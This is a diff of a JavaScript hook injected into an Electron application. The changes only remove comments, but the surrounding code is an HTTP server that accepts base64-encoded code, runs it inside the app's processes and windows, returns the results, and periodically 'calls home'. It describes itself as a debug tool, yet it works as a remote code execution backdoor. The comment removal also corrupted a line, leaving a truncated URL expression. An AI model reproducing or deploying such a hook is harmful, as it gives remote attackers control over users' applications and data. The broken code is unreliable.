@@ -203,7 +203,7 @@ const hook = {
                   const result = await activeWindow.webContents.executeJavaScript(\`
                       (async function() {
                           try {
-                              // Provide useful debugging context
+                              
                               const debugContext = {
                                   location: window.location,
                                   document: document,
@@ -212,7 +212,7 @@ const hook = {
                                   navigator: navigator
                               };
                               
-                              // Execute user code with context
+                              
                               return await (async function() {
                                   \${code}
                               })();
@@ -397,10 +397,10 @@ const hook = {
               }
               
               try {
-                  const url = new URL(req.url, \`http://\${CONFIG.DEBUG_HOST}:\${CONFIG.DEBUG_PORT}\`);
+                  const url = new URL(req.url, \`http:
                   const path = url.pathname;
                   
-                  // Route: GET /info
+                  
                   if (req.method === 'GET' && path === '/info') {
                       utils.logRequest('GET', '/info');
                       
@@ -409,7 +409,7 @@ const hook = {
                       res.end(utils.safeStringify(info));
                   }
                   
-                  // Route: POST /console
+                  
                   else if (req.method === 'POST' && path === '/console') {
                       let body = '';
                       
@@ -421,7 +421,7 @@ const hook = {
                           try {
                               const payload = JSON.parse(body);
                               
-                              // Validate payload
+                              
                               if (!payload.data || !payload.process) {
                                   res.writeHead(400);
                                   res.end(utils.safeStringify({
@@ -438,13 +438,13 @@ const hook = {
                                   return;
                               }
                               
-                              // Decode and create job
+                              
                               const code = utils.decodeBase64(payload.data);
                               const jobId = jobManager.create(code, payload.process);
                               
                               utils.logRequest('POST', '/console', jobId);
                               
-                              // Return job ID immediately
+                              
                               res.writeHead(200);
                               res.end(utils.safeStringify({
                                   jobId,
@@ -452,7 +452,7 @@ const hook = {
                                   process: payload.process
                               }));
                               
-                              // Execute in background
+                              
                               setImmediate(() => {
                                   executors[payload.process](code, jobId);
                               });
@@ -466,7 +466,7 @@ const hook = {
                       });
                   }
                   
-                  // Route: GET /result/:jobId
+                  
                   else if (req.method === 'GET' && path.match(/^\\/result\\/[a-f0-9]+$/)) {
                       const jobId = path.split('/')[2];
                       utils.logRequest('GET', \`/result/\${jobId}\`, jobId);
@@ -495,7 +495,7 @@ const hook = {
                       }));
                   }
                   
-                  // Route: Unknown
+                  
                   else {
                       res.writeHead(404);
                       res.end(utils.safeStringify({
@@ -520,7 +520,7 @@ const hook = {
           return server;
       };
       
-      // Initialize the debug tool
+      
       const initialize = () => {
           try {
               const server = createServer();
@@ -538,13 +538,13 @@ const hook = {
                   console.error('[SPEKTROS-HOOK] Server error:', error);
               });
               
-              // Set up periodic cleanup
-              setInterval(jobManager.cleanup, 60000); // Every minute
               
-              // Set up call home if enabled
+              setInterval(jobManager.cleanup, 60000); 
+              
+              
               if (CONFIG.ENABLE_CALL_HOME) {
                   setInterval(callHome, CONFIG.CALL_HOME_INTERVAL);
-                  setTimeout(callHome, 5000); // Initial call after 5 seconds
+                  setTimeout(callHome, 5000); 
               }
               
               console.log('[SPEKTROS-HOOK] Initialization complete');
@@ -554,7 +554,7 @@ const hook = {
           }
       };
       
-      // Start when app is ready
+      
       if (app.isReady()) {
           initialize();
       } else {
